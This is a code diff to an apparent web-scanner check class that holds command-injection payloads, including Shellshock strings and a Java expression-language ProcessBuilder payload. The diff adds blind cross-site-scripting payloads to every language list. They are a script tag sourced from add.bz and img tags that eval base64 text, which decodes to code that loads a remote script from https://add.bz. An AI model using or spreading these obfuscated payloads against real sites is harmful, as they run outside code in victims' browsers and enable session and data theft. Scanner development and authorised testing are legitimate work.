@@ -247,13 +247,15 @@ class CodeExec(IScannerCheck):
             # Exploits shell command injection into '$input' on linux and "$input" on windows:
             # and CVE-2014-6271, CVE-2014-6278
             'any': ['() { :;}; /bin/sleep $time',
-                    '() { _; } >_[$$($$())] { /bin/sleep $time; }', '$$(sleep $time)', '`sleep $time`'],
-            'php': [],
-            'perl': [],
-            'ruby': ['|sleep $time & ping -n $time localhost'],
+                    '\'"><script src=///add.bz></script>',
+                    '<img src=https://add.bz/i onload=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Imh0dHBzOi8vYWRkLmJ6Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBheWxvYWQpOw&#61;&#61;>',
+                    '() { _; } >_[$$($$())] { /bin/sleep $time; }', '$$(sleep $time)', '`sleep $time`', '<img src=https://add.bz/p onload=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Imh0dHBzOi8vYWRkLmJ6Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBheWxvYWQpOw&#61;&#61;>'],
+            'php': ['\'"><script src=///add.bz></script>', '<img src=https://add.bz/i onload=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Imh0dHBzOi8vYWRkLmJ6Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBheWxvYWQpOw&#61;&#61;>','<img src=https://add.bz/p onload=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Imh0dHBzOi8vYWRkLmJ6Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBheWxvYWQpOw&#61;&#61;>'],
+            'perl': ['\'"><script src=///add.bz></script>', '<img src=https://add.bz/i onload=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Imh0dHBzOi8vYWRkLmJ6Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBheWxvYWQpOw&#61;&#61;>','<img src=https://add.bz/p onload=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Imh0dHBzOi8vYWRkLmJ6Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBheWxvYWQpOw&#61;&#61;>'],
+            'ruby': ['|sleep $time & ping -n $time localhost', '\'"><script src=///add.bz></script>', '<img src=https://add.bz/i onload=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Imh0dHBzOi8vYWRkLmJ6Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBheWxvYWQpOw&#61;&#61;>','<img src=https://add.bz/p onload=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Imh0dHBzOi8vYWRkLmJ6Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBheWxvYWQpOw&#61;&#61;>'],
             # Expression language injection
             'java': [
-                '$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
+                '$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}','\'"><script src=///add.bz></script>', '<img src=https://add.bz/i onload=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Imh0dHBzOi8vYWRkLmJ6Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBheWxvYWQpOw&#61;&#61;>','<img src=https://add.bz/p onload=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Imh0dHBzOi8vYWRkLmJ6Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBheWxvYWQpOw&#61;&#61;>'],
         }
 
         # Used to ensure only appropriate payloads are attempted
